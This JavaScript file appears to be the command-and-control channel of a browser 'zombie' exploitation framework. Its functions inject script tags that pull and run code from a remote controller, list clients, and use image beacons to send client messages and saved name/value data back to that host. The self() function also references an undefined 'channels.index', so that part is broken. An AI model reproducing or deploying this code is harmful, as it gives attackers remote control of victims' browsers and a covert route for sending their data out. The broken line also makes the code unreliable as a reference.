ZombieAPI.Channel = {};
ZombieAPI.Channel.channels = new Array();
ZombieAPI.Channel.createInteractiveChannel = function (location) {
	var channel = {
		index: ZombieAPI.Channel.channels.length,
		location: location,
		callbacks: { pull: undefined, push: undefined, list: undefined, self: undefined, save: undefined }};
		
	channel.pull = function () {
		var script = document.createElement('script');
		script.differ = true;
		script.type = 'text/javascript';
		script.src = channel.location + '?action=pull' + ((channel.callbacks.pull == undefined)?'':'&callback=ZombieAPI.Channel.channels.channel' + channel.index + '.callbacks.pull');
		script.onload = function () {
			document.body.removeChild(script);
		};
		script.onerror = function () {
			document.body.removeChild(script);
		};
		
		document.body.appendChild(script);
	};
	
	channel.push = function (client, message) {
		if (channel.callbacks.push && !channel.callbacks.push(client, message))
			return false;
			
		var request = new Image();
		request.src = channel.location + '?action=push&client=' + escape(client) + '&message=' + escape(message);
		
		return true;
	};
	
	channel.list = function () {
		var script = document.createElement('script');
		script.differ = true;
		script.type = 'text/javascript';
		script.src = channel.location + '?action=list' + ((channel.callbacks.list == undefined)?'':'&callback=ZombieAPI.Channel.channels.channel' + channel.index + '.callbacks.list');
		script.onload = function () {
			document.body.removeChild(script);
		};
		
		document.body.appendChild(script);
	};
	
	channel.self = function () {
		var script = document.createElement('script');
		script.differ = true;
		script.type = 'text/javascript';
		script.src = channel.location + '?action=self' + ((channel.callbacks.self == undefined)?'':'&callback=ZombieAPI.Channel.channels.channel' + channels.index + '.callbacks.self');
		script.onload = function () {
			document.body.removeChild(script);
		};
		
		document.body.appendChild(script);		
	};
	
	channel.save = function (client, name, value) {
		if (channel.callbacks.save && !channel.callbacks.save(client, name, value))
			return false;
			
		var request = new Image();
		request.src = channel.location + '?action=save&client=' + escape(client) + '&name=' + escape(name) + '&value=' + escape(value);
		
		return true;
	};
	
	ZombieAPI.Channel.channels['channel' + channel.index] = channel;
	
	return channel;
};
